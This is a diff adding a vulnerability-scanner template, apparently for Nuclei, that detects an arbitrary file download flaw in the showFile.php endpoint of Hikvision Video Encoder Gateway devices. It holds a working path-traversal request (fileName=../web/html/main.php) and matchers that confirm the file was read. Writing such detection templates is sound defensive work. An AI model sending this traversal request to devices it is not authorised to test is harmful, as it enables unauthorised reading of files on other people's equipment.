@@ -1,0 +1,22 @@
+id: hikvision-showfile-arbitrary-file-download
+info:
+  name: Hikvision Video Encoder Gateway showFile.php Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template identifies an arbitrary file download vulnerability in Hikvision Video Encoding Gateway's showFile.php endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/serverLog/showFile.php?fileName=../web/html/main.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "请输入两位网关编号用于区分各个网关的设备编码"
+          - "当前网关编号"
+        part: body
